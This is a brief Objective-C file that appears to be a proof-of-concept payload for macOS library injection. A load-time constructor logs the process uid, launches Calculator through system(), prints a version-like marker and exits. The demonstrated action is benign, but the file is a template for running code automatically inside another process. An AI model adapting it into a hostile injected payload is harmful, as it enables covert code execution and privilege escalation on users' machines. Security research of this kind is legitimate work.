/*
  IMPORTANT NOTE:

  This snippet can no longer be compiled since macOS Mojave:
  The i386 architecture is deprecated for macOS
 */

#import <Foundation/Foundation.h>

#include <stdlib.h>

__attribute__((constructor)) void run() {
  NSLog(@"hello, this is uid %d", getuid());
  system("/Applications/Calculator.app/Contents/MacOS/Calculator");
  puts("mspribx.1.5.8\n");
  exit(0);
}
